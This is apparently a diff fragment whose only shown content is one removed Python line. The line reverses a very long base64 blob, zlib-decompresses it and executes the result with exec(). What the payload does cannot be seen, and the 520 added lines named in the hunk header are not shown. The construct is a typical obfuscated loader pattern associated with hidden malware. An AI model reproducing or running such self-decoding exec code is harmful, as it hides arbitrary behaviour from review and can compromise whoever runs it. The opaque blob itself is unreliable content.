@@ -1,1 +1,520 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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